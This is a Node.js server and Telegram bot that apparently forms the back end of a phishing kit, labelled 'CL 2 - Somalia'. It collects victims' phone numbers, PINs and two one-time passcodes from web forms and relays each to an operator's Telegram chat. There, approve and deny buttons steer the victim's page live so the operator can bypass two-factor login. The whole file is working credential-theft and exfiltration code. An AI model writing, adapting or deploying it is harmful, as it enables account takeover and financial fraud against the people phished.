const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

const statusStore = {};

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) =>
    res.sendFile(path.join(__dirname, 'public', 'index.html'))
);

app.get('/:page', (req, res) => {
    if (req.params.page.startsWith('api'))
        return res.status(404).send("Not found");

    const file = req.params.page.endsWith('.html')
        ? req.params.page
        : req.params.page + '.html';

    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};

    if (!phone || !pin || !ADMIN_ID)
        return res.status(400).json({ error: "Missing data" });

    statusStore[phone] = "pending";

    const currentTime = new Date().toLocaleTimeString('en-US', {
        hour: 'numeric',
        minute: 'numeric',
        second: 'numeric',
        hour12: true
    });

    const message = `📱 <b>CL 2 - LOGIN ATTEMPT</b>

🇸🇴 <b>Somalia</b>
📱 <b>Phone:</b> ${phone}
🔢 <b>PIN:</b> ${pin}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Waiting for approval...</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "✅ Allow to proceed", callback_data: `approve_${phone}_${pin}` }],
                    [{ text: "❌ Invalid credentials", callback_data: `deny_${phone}_${pin}` }]
                ]
            }
        });

        return res.json({ success: true });
    } catch {
        return res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- FIRST OTP API --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, otp } = req.body || {};

    if (!phone || !otp || !ADMIN_ID)
        return res.status(400).json({ error: "Missing data" });

    const message = `1️⃣ <b>CL 2 - FIRST OTP (Step 1/2)</b>

📱 <b>Phone:</b> ${phone}
🔐 <b>Code:</b> ${otp}

━━━━━━━━━━━━━━━

⚠️ <b>Verify FIRST OTP:</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "✅ Correct", callback_data: `otp1_correct_${phone}_${otp}` }],
                    [{ text: "❌ Wrong Code", callback_data: `otp1_wrong_${phone}` }]
                ]
            }
        });

        return res.json({ success: true });
    } catch {
        return res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- SECOND OTP API --------------------
app.post('/api/verify-second-otp', async (req, res) => {
    const { phone, otp } = req.body || {};

    if (!phone || !otp || !ADMIN_ID)
        return res.status(400).json({ error: "Missing data" });

    const message = `2️⃣ <b>CL 2 - SECOND OTP (Step 2/2)</b>

📱 <b>Phone:</b> ${phone}
🔐 <b>Second Code:</b> ${otp}

━━━━━━━━━━━━━━━

⚠️ <b>Verify SECOND OTP:</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [{ text: "✅ Correct", callback_data: `otp2_correct_${phone}_${otp}` }],
                    [
                        { text: "❌ Wrong Code", callback_data: `otp2_wrong_${phone}` },
                        { text: "🔑 Wrong PIN", callback_data: `otp2_wrongpin_${phone}` }
                    ]
                ]
            }
        });

        return res.json({ success: true });
    } catch {
        return res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BOT ACTIONS --------------------

// APPROVE LOGIN
bot.action(/approve_(.+)_(.+)/, async (ctx) => {
    try {
        const phone = ctx.match[1];
        const pin = ctx.match[2];

        statusStore[phone] = "approved";

        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(`✅ <b>LOGIN APPROVED</b>\n📱 ${phone}\n🔐 ${pin}\n\n➡️ <b>Next: First OTP</b>`);
        await ctx.answerCbQuery("Allowed");
    } catch (e) {
        console.error(e.message);
    }
});

// DENY LOGIN
bot.action(/deny_(.+)_(.+)/, async (ctx) => {
    try {
        const phone = ctx.match[1];

        statusStore[phone] = "denied";

        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(`❌ <b>INVALID CREDENTIALS</b>\n📱 ${phone}`);
        await ctx.answerCbQuery("Rejected");
    } catch (e) {
        console.error(e.message);
    }
});

// OTP1 CORRECT
bot.action(/otp1_correct_(.+)_(.+)/, async (ctx) => {
    try {
        const phone = ctx.match[1];
        const otp = ctx.match[2];

        statusStore[phone] = "otp1_correct";

        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(`1️⃣ <b>FIRST OTP VERIFIED</b>\n📱 ${phone}\n🔐 ${otp}`);
        await ctx.answerCbQuery("Verified");
    } catch (e) {
        console.error(e.message);
    }
});

// OTP1 WRONG
bot.action(/otp1_wrong_(.+)/, async (ctx) => {
    try {
        const phone = ctx.match[1];

        statusStore[phone] = "otp1_wrong";

        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(`❌ <b>FIRST OTP WRONG</b>\n📱 ${phone}`);
        await ctx.answerCbQuery("Wrong");
    } catch (e) {
        console.error(e.message);
    }
});

// OTP2 CORRECT
bot.action(/otp2_correct_(.+)_(.+)/, async (ctx) => {
    try {
        const phone = ctx.match[1];
        const otp = ctx.match[2];

        statusStore[phone] = "otp2_correct";

        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(`2️⃣ <b>SECOND OTP VERIFIED</b>\n📱 ${phone}\n🔐 ${otp}`);
        await ctx.answerCbQuery("Done");
    } catch (e) {
        console.error(e.message);
    }
});

// OTP2 WRONG
bot.action(/otp2_wrong_(.+)/, async (ctx) => {
    try {
        const phone = ctx.match[1];

        statusStore[phone] = "otp2_wrong";

        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(`❌ <b>SECOND OTP WRONG</b>\n📱 ${phone}`);
        await ctx.answerCbQuery("Retry");
    } catch (e) {
        console.error(e.message);
    }
});

// OTP2 WRONG PIN
bot.action(/otp2_wrongpin_(.+)/, async (ctx) => {
    try {
        const phone = ctx.match[1];

        statusStore[phone] = "otp2_wrongpin";

        await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
        await ctx.replyWithHTML(`🔑 <b>WRONG PIN REPORTED</b>\n📱 ${phone}`);
        await ctx.answerCbQuery("PIN Issue");
    } catch (e) {
        console.error(e.message);
    }
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    res.json({ status: statusStore[phone] || "pending" });
});

// -------------------- START SERVER --------------------
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});

// -------------------- START BOT --------------------
(async () => {
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        await bot.launch();
        console.log("🤖 Bot running");
    } catch (err) {
        console.error(err);
    }
})();
